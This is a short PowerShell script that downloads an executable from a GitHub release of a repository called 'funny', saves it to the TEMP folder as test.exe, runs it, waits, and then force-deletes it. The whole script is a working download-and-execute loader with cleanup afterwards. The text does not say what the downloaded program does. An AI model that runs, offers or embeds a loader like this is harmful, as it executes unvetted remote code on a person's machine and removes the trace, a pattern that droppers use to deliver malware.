$url = "https://github.com/greenstorm5417/funny/releases/download/v0.0.1/main.exe"
$outputPath = "$env:TEMP\test.exe"

try {
    # Download the exe file
    Write-Output "Downloading executable..."
    Invoke-WebRequest -Uri $url -OutFile $outputPath

    # Run the exe and wait for it to finish
    Write-Output "Running executable..."
    $process = Start-Process -FilePath $outputPath -Wait -PassThru

    # Wait for the process to complete
    Write-Output "Waiting for process to complete..."
    $process.WaitForExit()

    # Delete the downloaded exe file
    Write-Output "Deleting executable..."
    Remove-Item -Path $outputPath -Force

    Write-Output "Operation completed successfully."
} catch {
    Write-Output "An error occurred: $_"
}
